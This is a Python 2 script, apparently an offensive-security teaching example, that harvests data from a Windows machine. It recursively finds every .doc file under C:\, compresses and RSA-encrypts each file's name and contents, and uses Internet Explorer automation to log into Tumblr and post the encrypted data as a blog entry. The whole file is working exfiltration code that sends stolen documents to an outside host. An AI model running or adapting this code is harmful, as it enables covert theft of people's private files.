# coding=utf-8
"""
使用自动化COM组件窃取数据
"""
# coding=utf-8
import fnmatch
import os
import random
import time
import zlib

import win32com.client
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

doc_type = ".doc"
username = "test@test.com"
password = "testpassword"

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXUTgFoL/2EPKoN31l5T
lak7VxhdusNCWQKDfcN5Jj45GQ1oZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+T
h/zlVPjp0hgC6nOKOuwmlQ1jGvfVvaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls
2N7Pu5N1FLRW5PMhk6GW5rzVhwdDvnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79
ix4qXwYLe66CrgCHDf4oBJ/nO1oYwelxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6
YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS
1wIDAQAB
-----END PUBLIC KEY-----"""


def wait_for_browser(browser):
    # 等待浏览器完成加载
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return


def encrypt_string(plaintext):
    """
    通过RSA循环加密数据
    :param plaintext:
    :return:
    """
    chunk_size = 256
    print "Compressing: %d bytes" % len(plaintext)
    # 首先压缩数据
    plaintext = zlib.compress(plaintext)
    print "Encrypting %d bytes" % len(plaintext)
    # 根据公钥建立加密对象
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)
    encrypted = ""
    offset = 0
    while offset < len(plaintext):

        chunk = plaintext[offset:offset + 256]

        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))

        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size

    encrypted = encrypted.encode("base64")
    print "Base64 encoded crypto: %d" % len(encrypted)
    return encrypted


def encrypt_post(filename):
    """
    对Tumblr信息进行加密x
    :param filename:
    :return:
    """
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents)

    return encrypted_title, encrypted_body


def random_sleep():
    time.sleep(random.randint(5, 10))
    return


def login_to_tumblr(ie):
    full_doc = ie.Document.all

    # 查找登录逼单
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    random_sleep()

    # 不同的登录注解
    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError, e:
        pass

    random_sleep()
    wait_for_browser(ie)
    return


def post_to_tumblr(ie, title, post):
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
            print "Set text area"
            i.focus()
        elif i.id == "create_post":
            print "Found post button"
            post_form = i
            i.focus()

    # 将焦点移开
    random_sleep()
    title_box.focus()
    random_sleep()

    # 提交表单
    post_form.children[0].click()
    wait_for_browser(ie)

    random_sleep()

    return


def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1

    # 访问tumblr并登录
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    print "Logging in..."
    login_to_tumblr(ie)
    print "Logged in...navigating"

    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    # 加密文件今夕
    title, body = encrypt_post(document_path)

    print "Creating new post..."
    post_to_tumblr(ie, title, body)
    print "Posted!"

    # 退出
    ie.Quit()
    ie = None

    return


def driver():
    for parent, directories, filenames in os.walk("C:\\"):
        for filename in fnmatch.filter(filenames, "*%s" % doc_type):
            document_path = os.path.join(parent, filename)
            print "Found: %s" % document_path
            exfiltrate(document_path)
            raw_input("Continue?")
